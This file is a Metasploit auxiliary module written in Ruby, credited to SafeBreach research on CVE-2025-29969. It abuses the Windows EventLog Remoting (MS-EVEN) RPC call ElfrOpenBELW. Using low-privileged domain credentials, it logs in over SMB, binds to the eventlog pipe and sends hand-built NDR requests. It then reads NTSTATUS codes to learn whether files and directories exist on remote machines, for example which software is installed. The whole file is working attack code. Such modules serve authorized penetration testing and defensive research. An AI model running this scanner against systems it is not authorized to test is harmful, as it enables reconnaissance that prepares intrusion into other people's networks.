# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'windows_error'
require 'ruby_smb'
require 'ruby_smb/error'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SMB::Client::Authenticated
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::OptionalSession::SMB

  # MS-EVEN (EventLog Remoting Protocol) endpoint for DCERPC bind
  module Even
    UUID = '82273fdc-e32a-18c3-3f78-827929dc23ea'
    VER_MAJOR = 0
    VER_MINOR = 0
  end

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MS-EVEN RPC Remote File Existence Check',
        'Description' => %q{
          This module abuses the MS-EVEN (EventLog Remoting) RPC service to check
          whether a file or directory exists on a remote Windows system. The
          ElfrOpenBELW function internally performs a CreateFile on the server, and
          the resulting NTSTATUS error code reveals whether the path exists, is a
          directory, or is absent.

          This works with low-privileged domain credentials against any machine
          running the EventLog service (enabled by default on Windows 11 and
          Windows Server 2025). In a domain environment, the Program Files
          directory is readable by the Users group, allowing enumeration of
          installed software on remote machines.
        },
        'Author' => [
          'Yarin A. (SafeBreach)', # Original research and PoC
          'bcoles', # metasploit
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://www.safebreach.com/blog/safebreach_labs_discovers_cve-2025-29969/'],
          ['URL', 'https://github.com/SafeBreach-Labs/EventLogin-CVE-2025-29969'],
          ['URL', 'https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f'],
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('FILE_PATH', [false, 'Remote file path to check (e.g., C:\\Program Files\\Wireshark)']),
        OptPath.new('FILE_PATHS_FILE', [false, 'File containing remote paths to check, one per line']),
      ]
    )
  end

  def run_host(_ip)
    paths = gather_paths
    fail_with(Failure::BadConfig, 'No file paths specified. Set FILE_PATH or FILE_PATHS_FILE') if paths.empty?

    if session
      print_status("Using existing session #{session.sid}")
      self.simple = session.simple_client
      peer = simple.peerhost
    else
      begin
        connect
      rescue Rex::ConnectionError => e
        fail_with(Failure::Unreachable, e.message)
      end

      begin
        smb_login
      rescue Rex::Proto::SMB::Exceptions::Error, RubySMB::Error::RubySMBError => e
        fail_with(Failure::NoAccess, "Unable to authenticate ([#{e.class}] #{e}).")
      end
      peer = sock.peerhost
    end

    begin
      @tree = simple.client.tree_connect("\\\\#{peer}\\IPC$")
    rescue RubySMB::Error::RubySMBError => e
      fail_with(Failure::Unreachable, "Unable to connect to IPC$ share ([#{e.class}] #{e}).")
    end

    begin
      vprint_status('Opening \\pipe\\eventlog')
      @pipe = @tree.open_file(filename: 'eventlog', write: true, read: true)

      vprint_status('Binding to MS-EVEN interface...')
      @pipe.bind(
        endpoint: Even,
        auth_level: RubySMB::Dcerpc::RPC_C_AUTHN_LEVEL_PKT_INTEGRITY,
        auth_type: RubySMB::Dcerpc::RPC_C_AUTHN_WINNT
      )
      vprint_good('Bound to MS-EVEN (EventLog) interface')
    rescue RubySMB::Error::RubySMBError => e
      fail_with(Failure::Unreachable, "Unable to bind to MS-EVEN endpoint ([#{e.class}] #{e}).")
    end

    report_service(
      host: rhost,
      port: rport,
      proto: 'tcp',
      name: 'smb',
      info: 'SMB named pipe MS-EVEN (EventLog Remoting Protocol) RPC service'
    )

    paths.each do |file_path|
      check_file_existence(file_path)
    end
  rescue ::Rex::ConnectionError, ::Errno::ECONNRESET, ::Errno::EINTR, ::EOFError => e
    # Scanner mixin silently swallows these exceptions — rescue them here so the user sees output
    print_error("Connection error: #{e.class} - #{e.message}")
  rescue ::Rex::TimeoutError, ::Timeout::Error => e
    print_error("Timeout: #{e.message}")
  end

  def cleanup
    if @pipe
      begin
        @pipe.close
      rescue StandardError => e
        vprint_warning("Pipe close error: #{e.message}")
      end
      @pipe = nil
    end
    if @tree
      begin
        @tree.disconnect!
      rescue StandardError => e
        vprint_warning("Tree disconnect error: #{e.message}")
      end
      @tree = nil
    end
    super
  end

  def check_file_existence(file_path)
    nt_path = to_nt_path(file_path)
    vprint_status("Checking: #{nt_path}")

    nt_status = query_path_status(nt_path)
    return if nt_status.nil?

    # NT native paths (\??\C:\...) return STATUS_INVALID_PARAMETER for
    # directories. Probe with a nonexistent child to resolve ambiguity.
    if nt_status == ::WindowsError::NTStatus::STATUS_INVALID_PARAMETER
      nt_status = probe_directory(nt_path)
      return if nt_status.nil?
    end

    report_file_status(file_path, nt_status)
  rescue RubySMB::Dcerpc::Error::FaultError => e
    print_error("#{file_path} - DCERPC fault: #{e.status_name} (0x#{e.status_code.to_s(16).rjust(8, '0')})")
  rescue RubySMB::Error::RubySMBError => e
    print_error("#{file_path} - SMB error: #{e.message}")
  rescue ::EOFError
    print_error("#{file_path} - Connection closed unexpectedly")
  end

  # Convert Win32 drive letter paths (C:\...) to NT native format (\??\C:\...).
  # Paths already in NT format or without a drive letter are left unchanged.
  def to_nt_path(path)
    nt = path.dup
    nt.sub!(/\A([A-Za-z]:\\)/) { "\\??\\#{::Regexp.last_match(1)}" }
    # Strip trailing backslash, but preserve drive roots (C:\ or \??\C:\)
    nt.chomp!('\\') unless nt.match?(/:\\\z/)
    nt
  end

  # Query a path via ElfrOpenBELW and return the resolved NTStatus, or nil on error.
  def query_path_status(path)
    raw_response = even_call(path)
    if raw_response.nil? || raw_response.length < 4
      print_error("#{path} - Unexpected response")
      return nil
    end

    status_code = raw_response[-4, 4].unpack1('V')
    status = ::WindowsError::NTStatus.find_by_retval(status_code).first
    if status.nil?
      vprint_status("#{path} - Unknown NTSTATUS 0x#{status_code.to_s(16).rjust(8, '0')} (#{status_code})")
    end
    status
  end

  # Probe whether a directory exists by querying a random child path.
  # Maps probe results back to standard NTStatus codes that report_file_status handles.
  def probe_directory(dir_path)
    probe = "#{dir_path}\\#{Rex::Text.rand_text_alpha(8)}"
    vprint_status("Probing directory: #{probe}")

    status = query_path_status(probe)
    return nil if status.nil?

    case status
    when ::WindowsError::NTStatus::STATUS_OBJECT_NAME_NOT_FOUND
      # Random child not found inside directory — directory exists
      ::WindowsError::NTStatus::STATUS_FILE_IS_A_DIRECTORY
    when ::WindowsError::NTStatus::STATUS_OBJECT_PATH_NOT_FOUND
      # Path to child doesn't exist — directory doesn't exist
      ::WindowsError::NTStatus::STATUS_OBJECT_NAME_NOT_FOUND
    else
      status
    end
  end

  # Send ElfrOpenBELW (Opnum 9) to check file existence.
  # Uses manual stub assignment because RubySMB's dcerpc_request
  # silently discards stub data for non-registered endpoints.
  # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f11c9d8
  def even_call(path)
    stub = build_elfr_open_belw_stub(path)
    request = RubySMB::Dcerpc::Request.new({ opnum: 9 })
    request.stub.assign(stub)

    @pipe.set_integrity_privacy(
      request,
      auth_level: RubySMB::Dcerpc::RPC_C_AUTHN_LEVEL_PKT_INTEGRITY,
      auth_type: RubySMB::Dcerpc::RPC_C_AUTHN_WINNT
    )

    @pipe.ioctl_send_recv(
      request,
      auth_level: RubySMB::Dcerpc::RPC_C_AUTHN_LEVEL_PKT_INTEGRITY,
      auth_type: RubySMB::Dcerpc::RPC_C_AUTHN_WINNT
    )
  end

  # Build NDR-encoded stub for ElfrOpenBELW.
  #
  # Wire format (MS-EVEN 3.1.4.12):
  #   [in] EVENTLOG_HANDLE_W UNCServerName  - NULL pointer
  #   [in] RPC_UNICODE_STRING BackupFileName - the path to check
  #   [in] unsigned long MajorVersion        - 1
  #   [in] unsigned long MinorVersion        - 1
  def build_elfr_open_belw_stub(path)
    stub = ''.b

    # UNCServerName: NULL pointer
    stub << [0].pack('V')

    # BackupFileName: RPC_UNICODE_STRING (MS-DTYP 2.3.10)
    # MaximumLength must be Length + 1 to satisfy the EventLog service's
    # internal validation.
    unicode_path = path.encode('UTF-16LE').b
    byte_length = unicode_path.length
    char_count = byte_length / 2

    stub << [byte_length, byte_length + 1].pack('vv') # Length, MaximumLength
    stub << [0x00020000].pack('V') # Buffer referent ID

    # Conformant varying array: MaxCount, Offset, ActualCount, data
    stub << [char_count, 0, char_count].pack('VVV')
    stub << unicode_path

    # Pad to 4-byte alignment
    pad = (4 - (stub.length % 4)) % 4
    stub << "\x00".b * pad

    # MajorVersion, MinorVersion
    stub << [1, 1].pack('VV')

    stub
  end

  def report_file_status(file_path, nt_status)
    case nt_status
    when ::WindowsError::NTStatus::STATUS_SUCCESS
      print_good("#{file_path} - Exists (valid event log file)")
      store_file_note(file_path, 'exists_evtx')
    when ::WindowsError::NTStatus::STATUS_EVENTLOG_FILE_CORRUPT
      print_good("#{file_path} - Exists (file)")
      store_file_note(file_path, 'exists')
    when ::WindowsError::NTStatus::STATUS_FILE_IS_A_DIRECTORY
      print_good("#{file_path} - Exists (directory)")
      store_file_note(file_path, 'exists_directory')
    when ::WindowsError::NTStatus::STATUS_OBJECT_NAME_NOT_FOUND
      vprint_status("#{file_path} - Does not exist")
    when ::WindowsError::NTStatus::STATUS_OBJECT_PATH_NOT_FOUND
      vprint_status("#{file_path} - Path not found")
    when ::WindowsError::NTStatus::STATUS_ACCESS_DENIED
      vprint_error("#{file_path} - Access denied")
    else
      status_name = nt_status ? nt_status.name : 'Unknown'
      vprint_status("#{file_path} - #{status_name}")
    end
  end

  def store_file_note(file_path, file_status)
    report_note(
      host: rhost,
      port: rport,
      proto: 'tcp',
      sname: 'smb',
      type: 'smb.ms_even.file_existence',
      data: { path: file_path, status: file_status }
    )
  end

  def gather_paths
    paths = []
    paths << datastore['FILE_PATH'] unless datastore['FILE_PATH'].blank?

    unless datastore['FILE_PATHS_FILE'].blank?
      unless ::File.readable?(datastore['FILE_PATHS_FILE'])
        fail_with(Failure::BadConfig, "FILE_PATHS_FILE not found or unreadable: #{datastore['FILE_PATHS_FILE']}")
      end

      ::File.readlines(datastore['FILE_PATHS_FILE']).each do |line|
        path = line.strip
        paths << path unless path.empty? || path.start_with?('#')
      end
    end

    paths
  end
end
